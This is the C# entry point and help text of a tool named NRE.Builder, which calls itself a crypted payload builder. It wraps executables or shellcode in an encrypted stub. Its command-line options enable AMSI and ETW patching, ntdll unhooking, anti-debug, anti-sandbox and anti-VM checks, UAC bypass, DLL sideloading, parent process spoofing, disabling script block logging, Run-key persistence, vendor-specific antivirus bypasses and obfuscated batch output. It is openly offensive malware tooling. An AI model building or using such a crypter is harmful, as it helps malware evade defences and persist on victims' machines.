using System;
using System.IO;
using NRE.Builder.Configuration;
using NRE.Builder.Commands;
using NRE.Core.Evasion;

namespace NRE.Builder
{
    static class Program
    {
        static int Main(string[] args)
        {
            string input = "";
            string output = "crypted.exe";
            bool compress = false;
            bool outputBat = false;
            // Default: AMSI + ETW only (reliable). Use --unhook / --wldp to add more.
            var evasion = EvasionOptions.PatchAMSI | EvasionOptions.PatchETW;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "--input":
                    case "-i":
                        if (i + 1 < args.Length) input = args[++i];
                        break;
                    case "--output":
                    case "-o":
                        if (i + 1 < args.Length) output = args[++i];
                        break;
                    case "--compress":
                    case "-c":
                        compress = true;
                        break;
                    case "--no-amsi":
                        evasion &= ~EvasionOptions.PatchAMSI;
                        break;
                    case "--no-etw":
                        evasion &= ~EvasionOptions.PatchETW;
                        break;
                    case "--antidebug":
                        evasion |= EvasionOptions.AntiDebug;
                        break;
                    case "--no-antidebug":
                        evasion &= ~EvasionOptions.AntiDebug;
                        break;
                    case "--antisandbox":
                        evasion |= EvasionOptions.AntiSandbox;
                        break;
                    case "--no-antisandbox":
                        evasion &= ~EvasionOptions.AntiSandbox;
                        break;
                    case "--antivm":
                        evasion |= EvasionOptions.AntiVM;
                        break;
                    case "--no-antivm":
                        evasion &= ~EvasionOptions.AntiVM;
                        break;
                    case "--unhook":
                        evasion |= EvasionOptions.UnhookNtdll;
                        break;
                    case "--no-unhook":
                        evasion &= ~EvasionOptions.UnhookNtdll;
                        break;
                    case "--wldp":
                        evasion |= EvasionOptions.PatchWLDP;
                        break;
                    case "--no-wldp":
                        evasion &= ~EvasionOptions.PatchWLDP;
                        break;
                    case "--amsi-hbp":
                        evasion |= EvasionOptions.AmsiHBP;
                        break;
                    case "--uac-bypass":
                        evasion |= EvasionOptions.UacBypass;
                        break;
                    case "--dll-sideload":
                        evasion |= EvasionOptions.DllSideload;
                        break;
                    case "--parent-spoof":
                        evasion |= EvasionOptions.ParentSpoof;
                        break;
                    case "--threadpool":
                        evasion |= EvasionOptions.ExecuteThreadPool;
                        break;
                    case "--scriptblock-log":
                        evasion |= EvasionOptions.DisableScriptBlockLog;
                        break;
                    case "--startup":
                        evasion |= EvasionOptions.PersistStartup;
                        break;
                    case "--specific":
                        evasion |= EvasionOptions.AvSpecificBypass;
                        break;
                    case "--bat":
                        outputBat = true;
                        break;
                    case "--help":
                    case "-h":
                        PrintHelp();
                        return 0;
                }
            }

            if (string.IsNullOrEmpty(input))
            {
                Console.Error.WriteLine("Missing --input. Use --help for usage.");
                return 1;
            }

            if (outputBat && !output.EndsWith(".bat", StringComparison.OrdinalIgnoreCase))
                output = Path.ChangeExtension(output, ".bat");

            var config = new BuildConfig
            {
                InputPath = input,
                OutputPath = output,
                Compress = compress,
                Evasion = evasion,
                OutputBat = outputBat,
            };

            return BuildCommands.RunBuild(config) ? 0 : 1;
        }

        static void PrintHelp()
        {
            Console.WriteLine(@"
NRE.Builder - Crypted payload builder

Usage:
  NRE.Builder --input <file> [options]

Required:
  -i, --input <path>     Input PE or shellcode file (.exe/.dll)

Output:
  -o, --output <path>    Output path (default: cryption.exe)

Compression:
  -c, --compress        Compress payload (LZNT1) before encryption

Evasion (default: AMSI + ETW only; add others as needed):
  --no-amsi             Disable AMSI bypass
  --no-etw              Disable ETW patching
  --unhook              Unhook ntdll from disk
  --wldp                Patch WLDP
  --amsi-hbp            Use AMSI hardware breakpoint bypass (patchless)
  --antidebug           Exit if debugger present
  --antisandbox         Exit if sandbox detected
  --antivm              Exit if VM detected
  --uac-bypass          Enable UAC bypass
  --dll-sideload        Enable DLL sideloading
  --parent-spoof        Enable parent process spoofing
  --threadpool          Run shellcode via CLR thread pool (in-memory)
  --scriptblock-log     Disable script block logging (ETW)
  --startup             Install to AppData and add Run key for startup persistence
  --specific            AV-specific bypasses: detect vendor and apply tailored bypass set
  --bat                 Output obfuscated .bat instead of .exe (decodes and runs stub)

Other:
  -h, --help            Show this help

Examples:
  NRE.Builder -i payload.exe -o cryption.exe
  NRE.Builder -i payload.exe -o out.exe -c
  NRE.Builder -i NRE.TestPayload\bin\Release\net48\NRE.TestPayload.exe -o test_crypted.exe -c
");
        }
    }
}
